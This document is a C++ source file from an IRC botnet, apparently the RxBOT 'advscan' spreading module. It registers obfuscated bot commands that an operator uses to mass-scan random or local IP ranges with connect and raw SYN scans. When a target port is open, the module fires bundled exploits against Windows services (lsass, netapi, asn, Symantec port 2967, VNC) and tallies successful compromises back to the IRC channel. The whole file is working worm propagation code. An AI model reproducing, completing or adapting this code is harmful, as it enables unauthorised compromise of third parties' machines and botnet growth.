#include "../main.h"
#include "advscan.h"
#include "../mainctrl.h"
#include "../sdcompat.h"
#include "rthread.h"
#include "lsass.h"
#include "netapi.h"
#include "asn.h"
#include "vnc.h"
#include "sym.h"
// RxBOT ADVSCAN
// from rbot pk
// Converted by AfroNerd
// .. thats why it sucks so badly.
// <ghosn> i love afronerd :(
/*
typedef struct HTTPD  {
	SOCKET sock;
	char chan[128];
	char file[MAX_PATH];
	char path[MAX_PATH];
	char dir[MAX_PATH];
	int port;
	int length;
	int threadnum;
	BOOL notice;
	BOOL silent;
	BOOL enabled;
	BOOL type;
	BOOL info;

} HTTPD;
*/
#ifndef NO_HTTPD
#define NO_HTTPD
#endif

#ifndef NO_TFTPD
#define NO_TFTPD
#endif

CRITICAL_SECTION CriticalSection; 

ADVINFO advinfo[1000];

EXPLOIT exploit[]={
//	{"dcom135", "Dcom135", 135, dcom, 0, TRUE, FALSE},
//	{"dcom445", "Dcom445", 445, dcom, 0, TRUE, FALSE},
	{"sym", "sym", 2967, SYM, 0, TRUE, FALSE},
	//{"net139", "net139", 139, netapi, 0, TRUE, FALSE},
	{"net445", "net445", 445, netapi, 0, TRUE, FALSE},
	{"lsass", "lsass", 445, lsass, 0, TRUE, FALSE},
    {"asn445", "asn445", 445, asn, 0, TRUE, FALSE},
    {"asn139", "asn139", 139, asn, 0, TRUE, FALSE},
    {"vnc", "vnc", 5900, VNCExploit, 0, TRUE, FALSE},
	{NULL, NULL, 0, NULL, 0, FALSE, FALSE}
};

// WTf?heh good question, hmm... 
void CAdvScan::Init() {
	g_cMainCtrl.m_cAdvScan.expl=exploit;
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdCurIP,		dp(1,4,22,79,3,9,16,0).CStr(),			this); 
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdAdvScan,		dp(1,4,22,79,19,20,1,18,20,0).CStr(),	this); 
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdAdvScanStop,	dp(1,4,22,79,19,20,15,16,0).CStr(),			this); 
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdAdvStats,		dp(1,4,22,79,19,20,1,20,19,0).CStr(),	this); 
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdFTPStats,		dp(6,20,16,79,19,20,1,20,19,0).CStr(),	this); 
}


bool CAdvScan::HandleCommand(CMessage *pMsg)
{
	DWORD id=0;
	char sendbuf[IRCLINE];
	int i;

	// Current IP
	if(!pMsg->sCmd.Compare(m_cmdCurIP.sName.Str())) 
	{
		if (findthreadid(SCAN_THREAD) > 0) 
		{
			IN_ADDR in;
			in.s_addr = advinfo[findthreadnum(SCAN_THREAD)].ip;
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sDest.Str(), "scan: cip (%s)", inet_ntoa(in));
		} else {
			g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "scan: not started", pMsg->sDest.Str());
		}
		return true;
	};

	// FTP Stats
	if(!pMsg->sCmd.Compare(m_cmdFTPStats.sName.Str())) 
	{
		int tFTP = 0;
		int tStats = g_cMainCtrl.m_cSendFileFTP.m_totalSends;
		tFTP=atoi(pMsg->sChatString.Token(1, " ").CStr());
		if (tStats >= tFTP) {
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sDest.Str(),
				"ftp: port: %d, total sends: %d", 
				g_cMainCtrl.m_cBot.bot_ftrans_port_ftp.iValue, 
				tStats);
		}
		return true;
	};

	// Scan Stop
	if(!pMsg->sCmd.Compare(m_cmdAdvScanStop.sName.Str())) 
	{
		if ((i=killthreadid(SCAN_THREAD,0)) > 0)
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sDest.Str(), "scan: stopped (%d threads)", i);
		else
			g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "scan: couldn't stop", pMsg->sDest.Str());
		return false;
	};

	// Start Scanning
	if(!pMsg->sCmd.Compare(m_cmdAdvScan.sName.Str())) 
	{
		int scanthreads=findthreadid(SCAN_THREAD);
		if (scanthreads + atoi(pMsg->sChatString.Token(2," ").CStr()) > MAXSCANTHRD) 
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sDest.Str(), "scan: too many threads (%s)", scanthreads);
		else {
			
			ADVSCAN advscan;
			advscan.port = atoi(pMsg->sChatString.Token(1," ").CStr()); // check for method or port number
			advscan.threads = atoi(pMsg->sChatString.Token(2," ").CStr());
			advscan.delay = atoi(pMsg->sChatString.Token(3," ").CStr());
			advscan.delay = ((advscan.delay < 1)?(1):(advscan.delay));
			advscan.delay = ((advscan.delay > 60)?(60):(advscan.delay));
			advscan.minutes = atoi(pMsg->sChatString.Token(4," ").CStr());
			advscan.minutes = ((advscan.minutes > MAXSCANTIME)?(MAXSCANTIME):(advscan.minutes));
			advscan.exploit = -1;
			
			for(i=0;exploit[i].port != 0;i++) 
			{
				if (strcmp(exploit[i].command,pMsg->sChatString.Token(1," ").CStr()) == 0) 
				{
					advscan.port = exploit[i].port;
					advscan.exploit = i;
					break;
				}
			}
			
			if (advscan.port == 0) 
			{
				g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "scan: invalid port", pMsg->sDest.Str());
				return 1;
			}

			if (pMsg->sChatString.Token(5," ").Find(".") ) {
				_snprintf(advscan.ip,sizeof(advscan.ip),pMsg->sChatString.Token(5," ").CStr());
				advscan.random = ((strchr(pMsg->sChatString.Token(5," ").CStr(),'x'))?(TRUE):(FALSE));
			} else {
				if(pMsg->sChatString.Find(" -r") || pMsg->sChatString.Find(" -a") || pMsg->sChatString.Find(" -b"))
				{
					SOCKADDR_IN ssin;
					int ssin_len=sizeof(ssin);
					getsockname(g_cMainCtrl.m_cIRC.m_sSocket,(LPSOCKADDR)&ssin,&ssin_len);
					ssin.sin_addr.S_un.S_addr&=(pMsg->sChatString.Find(" -a")) ? 0xFF : 0xFFFF;
					strncpy(advscan.ip,inet_ntoa(ssin.sin_addr), sizeof(advscan.ip));

					if(pMsg->sChatString.Find(" -r"))
					{
						int extractip = ((pMsg->sChatString.Find(" -a")) ? 3 : 2);
						for (char *c=strrchr(advscan.ip,'0'),i=0;i<extractip && c;c[0]='x',c=strrchr(advscan.ip,'0'),i++);
						advscan.random = true;
					} else {
						advscan.random = false;
					}
				} else {
					g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "scan: no ip specified", pMsg->sDest.Str());
					return 1;
				};
			};
					
			advscan.sock = g_cMainCtrl.m_cIRC.m_sSocket;
			advscan.notice = 0;
			advscan.silent = pMsg->bSilent;
			_snprintf(advscan.chan,sizeof(advscan.chan),pMsg->sDest.CStr());
			advscan.msgchan[0] = '\0';
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sDest.Str(), 
				"advscan(%s): %s port scan %s:%d [delay %d sec] [%d min] [%d threads]",
				exploit[advscan.exploit].name, ((advscan.random)?("random"):("sequential")), advscan.ip, advscan.port,
				advscan.delay, advscan.minutes, advscan.threads);
			advscan.threadnum = raddthread(sendbuf,SCAN_THREAD,NULL);
			AdvScanner((LPVOID)&advscan);	// Scanner with own thread
			return true;
		};  
	};

	// Scan Stats
	if(!pMsg->sCmd.Compare(m_cmdAdvStats.sName.Str())) 
	{
		char buffer[IRCLINE], buffer2[IRCLINE];
		int extotal = 0;
		int intOver = atoi(pMsg->sChatString.Token(1, " ").CStr());
		bool didExp=0;
		for(int i=0; exploit[i].port != 0; i++) 
		{
			if(exploit[i].stats>=intOver)didExp=1;
		}
		
		sprintf(buffer, "scan: stats:");
		for(i=0; exploit[i].port != 0; i++) 
		{
			extotal += exploit[i].stats;
			sprintf(buffer2," %s: %d,",exploit[i].name,exploit[i].stats);
			strncat(buffer, buffer2, sizeof(buffer));
		}
		sprintf(buffer2, " total: %d", extotal);
		strncat(buffer, buffer2, sizeof(buffer));

		if(didExp)	irc_privmsg(NULL, pMsg->sDest.Str(), buffer, pMsg->bNotice);
		addlog(buffer);
	};

	return false;
};

bool AddEx(EXINFO exinfo)
{
	// AddEx: AfroNerd
	//char sendbuf[IRCLINE];
	//g_cMainCtrl.m_cIRC.SendFormat(exinfo.notice, exinfo.notice, 
	//	g_cMainCtrl.m_cBot.scan_channel.sValue.Str(),
	//	"%s: exploited (%s)", exploit[exinfo.exploit].name, exinfo.ip);
	exploit[exinfo.exploit].stats++;
	return true;
};

//int tftpport=69;
//int httpport=80;

char *GetIP(SOCKET sock){
	static char IP[16];

	SOCKADDR sa;
	int sas = sizeof(sa);
	memset(&sa, 0, sizeof(sa));
	getsockname(sock, &sa, &sas);

	sprintf(IP,"%d.%d.%d.%d",(BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5]);
	return (IP);}

void CheckServers(ADVSCAN scan){
	THREAD * threads = g_cMainCtrl.m_cAdvScan.threads;
	char sendbuf[IRCLINE];

	DWORD id;

	if(scan.exploit != -1) {
		if (exploit[scan.exploit].tftp) {
			/*if (findthreadid(TFTP_THREAD) == 0) {
				static TFTP tftp;
				tftp.port = tftpport;
				tftp.threads = 0;
				GetModuleFileName(0,tftp.filename,sizeof(tftp.filename));
				strncpy(tftp.requestname, g_cMainCtrl.m_cBot.bot_filename.sValue.CStr(), sizeof(tftp.requestname)-1);
				tftp.sock=scan.sock;
				tftp.notice = scan.notice;
				if (scan.msgchan[0] == '\0') {
					strncpy(tftp.chan, scan.chan, sizeof(tftp.chan)-1);
					tftp.silent = TRUE;
				} else {
					strncpy(tftp.chan, scan.msgchan, sizeof(tftp.chan)-1);
					tftp.silent = FALSE;
				}
				
				sprintf(sendbuf, "[TFTP]: Server started on Port: %d, File: %s, Request: %s.", tftp.port, tftp.filename, tftp.requestname);
				tftp.threadnum = raddthread(sendbuf,TFTP_THREAD,NULL);
				if (threads[tftp.threadnum].tHandle = CreateThread(NULL, 0, &tftpserver, (LPVOID)&tftp, 0, &id)) {
					while (tftp.gotinfo == FALSE) 
						Sleep(50);
				} else
					sprintf(sendbuf, "[TFTP]: Failed to start server, error: <%d>.", GetLastError());

				addlog(sendbuf);
			}*/
		}

	}

	return;
}

unsigned long AdvGetNextIP(int threadnum)
{
	DWORD host;

	memcpy(&host, &advinfo[threadnum].ip, 4);
	host = ntohl(host);
	host += 1;
	host = htonl(host);
	memcpy(&advinfo[threadnum].ip, &host, 4);

	return (advinfo[threadnum].ip);
}

unsigned long AdvGetNextIPRandom(char *scanmask, int threadnum)
{
	int ip1=-1,ip2=-1,ip3=-1,ip4=-1;

	if (strlen(scanmask) > 15) 
		return 0;

	sscanf(scanmask,"%d.%d.%d.%d",&ip1,&ip2,&ip3,&ip4);
	if (ip1==-1) ip1=rand();
	if (ip2==-1) ip2=rand();
	if (ip3==-1) ip3=rand();
	if (ip4==-1) ip4=rand();

	advinfo[threadnum].ip = (ip1+(ip2<<8)+(ip3<<16)+(ip4<<24));

	return (advinfo[threadnum].ip);
}

BOOL AdvPortOpen(unsigned long ip, unsigned int port, unsigned int delay)
{//yes but it doesnt detect open ;x mm auto accept while your afk
	//ok one sec tho :) lol this'll be an ass debugging when i cant look at it :D kk 
	/*#ifdef DBGCONSOLE
	g_cMainCtrl.m_cConsDbg.Log(1, "Wholy fucking shit! %s:%d\n",ip,port);
	#endif*/
	SOCKADDR_IN sin;
	unsigned long blockcmd=1;

	SOCKET sock = socket(AF_INET,SOCK_STREAM,0);
	if (sock == INVALID_SOCKET){
		return FALSE;
	}
	sin.sin_family = AF_INET;
	sin.sin_addr.S_un.S_addr = ip;
	sin.sin_port = htons((unsigned short)port);
	ioctlsocket(sock,FIONBIO,&blockcmd);
	connect(sock,(LPSOCKADDR)&sin,sizeof(sin));

	TIMEVAL timeout;
	timeout.tv_sec=delay;
	timeout.tv_usec=0;
	FD_SET rset;
	FD_ZERO(&rset);
	FD_SET(sock,&rset);

	int i = select(0,0,&rset,0,&timeout);
	closesocket(sock);

	if (i<=0)
	{	
		return FALSE;

	}
	else  {

	#ifdef DBGCONSOLE
//	g_cMainCtrl.m_cConsDbg.Log(1, "Port detected open for %d:%d\n",ip,port);
	#endif
		return TRUE;
	}
}

typedef struct tcphdr {

	unsigned short sport;			// Source port
	unsigned short dport;			// Destination port
	unsigned int   seq;				// Sequence number
	unsigned int   ack_seq;			// Acknowledgement number
	unsigned char  lenres;			// Length return size
	unsigned char  flags;			// Flags and header length
	unsigned short window;			// Window size
	unsigned short checksum;		// Packet Checksum
	unsigned short urg_ptr;			// Urgent Pointer

} TCPHEADR;

typedef struct pshdr {

	unsigned int   saddr;			// Source address
	unsigned int   daddr;			// Destination address
	unsigned char  zero;			// Placeholder
	unsigned char  proto;			// Protocol
	unsigned short length;			// TCP length
	struct tcphdr tcp;				// TCP Header struct

} RPSDHEADER;


BOOL SynPortOpen(unsigned long src_ip, unsigned long dest_ip, unsigned int port, unsigned int delay)
{
	char buffer[LOGLINE];
	int size;

	unsigned short src_port = 9801;

	TCPHEADER2 send_tcp;
	send_tcp.source = htons(src_port);
	send_tcp.dest = htons((unsigned short)port);
	send_tcp.seq = rand();
	send_tcp.ack_seq = 0;
	send_tcp.res1 = 0;
	send_tcp.res2 = 0;
	send_tcp.doff = 5;
	send_tcp.fin = 0;
	send_tcp.syn = 1;  /*This is the important part..;) */
	send_tcp.rst = 0;
	send_tcp.psh = 0;
	send_tcp.ack = 0;
	send_tcp.urg = 0;
	send_tcp.window = htons(512);
	send_tcp.check = 0;
	send_tcp.urg_ptr = 0;

	RPSDHEADER psdheader;
	psdheader.saddr = src_ip;
	psdheader.daddr = dest_ip;
	psdheader.zero = 0;
	psdheader.proto = IPPROTO_TCP;
	psdheader.length = htons(sizeof(send_tcp));

	memcpy (&psdheader.tcp, &send_tcp, sizeof (send_tcp));
	send_tcp.check = checksum((unsigned short *)&psdheader, sizeof (psdheader));

	SOCKADDR_IN ssin;
	memset(&ssin,0,sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = htons((unsigned short)port); 
	ssin.sin_addr.s_addr = dest_ip;
	int ssin_len = sizeof(ssin);
  
	SOCKET tcp_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if (tcp_sock == INVALID_SOCKET) {
		addlog("socket open failed");
		return FALSE;
	}

	// 10022: WSAEINVAL - An invalid argument was supplied.
	if ((size = sendto(tcp_sock,(const char *)&send_tcp,sizeof(send_tcp),0,(LPSOCKADDR)&ssin,ssin_len)) != 20) {
		sprintf(buffer,"sendto() socket failed. sent = %d <%d>.", size, WSAGetLastError());
		addlog(buffer);
		closesocket(tcp_sock);
		return FALSE;
	}

	RECVHEADER recv_tcp;
	memset (&recv_tcp,'\0',sizeof(recv_tcp));
	while (recv_tcp.tcp.dest != src_port) {
		if (recvfrom(tcp_sock,(char *)&recv_tcp,sizeof(recv_tcp),0,(LPSOCKADDR)&ssin, &ssin_len) < 0) {
			addlog("recvfrom() socket failed");
			closesocket(tcp_sock);
			return FALSE;
		}
	}
  
	closesocket(tcp_sock);
	if (recv_tcp.tcp.syn == 1) {
		addlog("Socket open.");

		return TRUE;
	} else {
		addlog("Socket closed.");
		return FALSE;
	}
}

DWORD WINAPI AdvPortScanner(LPVOID param){

	THREAD * threads = g_cMainCtrl.m_cAdvScan.threads;
	IN_ADDR in;
	char logbuf[LOGLINE];

	ADVSCAN scan = *((ADVSCAN *)param);
	ADVSCAN *scanp = ((ADVSCAN *)param);
	int threadnum=scan.cthreadnum;
	int threadid=scan.cthreadid;
	scanp->cgotinfo = TRUE;
	srand(GetTickCount()); 
	while (advinfo[threads[threadnum].parent].info) {
		DWORD dwIP;
		
		if (scan.random)
			dwIP = AdvGetNextIPRandom(scan.ip,threads[threadnum].parent);
		else
			dwIP = AdvGetNextIP(threads[threadnum].parent);
		in.s_addr = dwIP;

		sprintf(logbuf,"[SCAN]: IP: %s:%d, Scan thread: %d, Sub-thread: %d.", 
			inet_ntoa(in), scan.port, threads[threadnum].parent, threadid); 
		sprintf(threads[threadnum].name, logbuf);

// i betcha problems in advportopen ;]
		if (AdvPortOpen(dwIP, scan.port, scan.delay) == TRUE) {
// k well let it scan while we check out this advportopen shit
		//if (SynPortOpen(finet_addr(GetIP(scan.sock)), dwIP, scan.port, scan.delay) == TRUE) {
			if (scan.exploit == -1) {
				EnterCriticalSection(&CriticalSection); 

				sprintf(logbuf,"[SCAN]: IP: %s, Port %d is open.",inet_ntoa(in),scan.port);
				if (!scan.silent) {
					if (scan.msgchan[0] != '\0')
						irc_privmsg(scan.sock,scan.msgchan,logbuf,scan.notice);
					else
						irc_privmsg(scan.sock,scan.chan,logbuf,scan.notice);
				}
				addlog(logbuf);

				LeaveCriticalSection(&CriticalSection);
			} else {

				EXINFO exinfo;

				sprintf(exinfo.ip, inet_ntoa(in));
				sprintf(exinfo.command, exploit[scan.exploit].command);
				if (scan.msgchan[0] != '\0')
					sprintf(exinfo.chan, scan.msgchan);
				else
					sprintf(exinfo.chan, scan.chan);
				exinfo.sock = scan.sock;
				exinfo.notice = scan.notice;
				exinfo.silent = scan.silent;
				exinfo.port = scan.port;
				exinfo.threadnum = threadnum;
				exinfo.exploit = scan.exploit;
				exploit[scan.exploit].exfunc(exinfo); 
				/*if (exploit[scan.exploit].exfunc(exinfo)) {
					EnterCriticalSection(&CriticalSection); 

					sprintf(logbuf,"[SCAN]: Finished with IP: %s, Port %d.",finet_ntoa(in),scan.port);
					irc_privmsg(scan.sock,scan.chan,logbuf,scan.notice, TRUE);
					addlog(logbuf);
	
					LeaveCriticalSection(&CriticalSection);
				} else {
					EnterCriticalSection(&CriticalSection); 

					sprintf(logbuf,"[SCAN]: Failed to exploit IP: %s, Port %d.",finet_ntoa(in),scan.port);
					irc_privmsg(scan.sock,scan.chan,logbuf,scan.notice, TRUE);
					addlog(logbuf);
	
					LeaveCriticalSection(&CriticalSection);
				}*/
				

			}
		}
		Sleep(2000);
	}
	clearthread(threadnum);
	ExitThread(0);
}

DWORD WINAPI AdvScanner(LPVOID param)
{
	#ifdef DBGCONSOLE
	g_cMainCtrl.m_cConsDbg.Log(1, "I'm In The ADVSCAN Thread\n");
	#endif

	THREAD * threads = g_cMainCtrl.m_cAdvScan.threads;
	char buffer[LOGLINE]; 
	//char szSelfExe[MAX_PATH];

	ADVSCAN scan = *((ADVSCAN *)param);
	ADVSCAN *scanp = (ADVSCAN *)param;
	scanp->gotinfo = TRUE;
	advinfo[scan.threadnum].ip = inet_addr(scan.ip);
	
	/*
	// FIX ME: Make this a standalone function
	if (!FileExists(szLocalPayloadFile)) {
		GetModuleFileName(0,szSelfExe,MAX_PATH);
		CopyFile(szSelfExe,szLocalPayloadFile,FALSE);
		// FIX ME: Make this copy to the same directory (could affect other stuff)
	}
*/
	CheckServers(scan);
	#ifdef DBGCONSOLE
	g_cMainCtrl.m_cConsDbg.Log(1, "Checked servers\n");
	#endif

	if (findthreadid(SCAN_THREAD) == 1) {
		DeleteCriticalSection(&CriticalSection); // just in case

	InitializeCriticalSection(&CriticalSection);
	};

	#ifdef DBGCONSOLE
	g_cMainCtrl.m_cConsDbg.Log(1, "initcriticalsection'd\n");
	#endif

	advinfo[scan.threadnum].info = TRUE;
	for (unsigned int i=1;i<=(scan.threads);i++) {
		scan.cthreadid = i;
		sprintf(buffer,"[SCAN]: %s:%d, Scan thread: %d, Sub-thread: %d.",scan.ip, scan.port,scan.threadnum,scan.cthreadid); 
		scan.cthreadnum = raddthread(buffer,SCAN_THREAD,NULL);
		threads[scan.cthreadnum].parent = scan.threadnum;
		if (threads[scan.cthreadnum].tHandle = CreateThread(0,0,&AdvPortScanner,(LPVOID)&scan,0,0)) {
			while (scan.cgotinfo == FALSE)
				Sleep(30);
		} else {
			sprintf(buffer, "[SCAN]: Failed to start worker thread, error: <%d>.", GetLastError());
			addlog(buffer);
		}

		Sleep(30);
	}

	if (scan.minutes != 0)
		Sleep(60000*scan.minutes);
	else 
		while (advinfo[scan.threadnum].info == TRUE) Sleep(2000);

	IN_ADDR in;
	in.s_addr = advinfo[scan.threadnum].ip;
	sprintf(buffer,"[SCAN]: Finished at %s:%d after %d minute(s) of scanning.", inet_ntoa(in), scan.port, scan.minutes);
	if (!scan.silent) irc_privmsg(scan.sock,scan.chan,buffer,scan.notice);
	addlog(buffer);

	advinfo[scan.threadnum].info = FALSE;
	Sleep(3000);

	if (findthreadid(SCAN_THREAD) == 1) 
		DeleteCriticalSection(&CriticalSection);

	clearthread(scan.threadnum);

	ExitThread(0);
}
